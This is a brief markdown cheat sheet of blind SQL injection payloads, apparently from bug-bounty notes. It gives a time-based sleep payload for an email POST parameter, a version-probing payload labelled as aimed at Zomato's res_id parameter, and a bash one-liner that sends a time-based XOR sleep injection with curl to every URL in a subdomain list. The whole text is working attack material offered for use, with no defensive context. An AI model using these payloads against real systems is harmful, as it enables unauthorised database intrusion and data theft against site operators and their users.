### Blind SQL injections:

1) SQL injection email parameter via POST method:

   Payload:

    ```
   '%2b(select*from(select(sleep(2)))a)%2b'
    ```

2) Zomato Blind sql:
   ```
   res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0

   ```

3) Blind SQL onliner for domains:
```
while read -r url; do echo "Testing $url"; curl -m 20 -s -o /dev/null -w "%{time_total}\n" "$url/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"; done < sub.txt

```
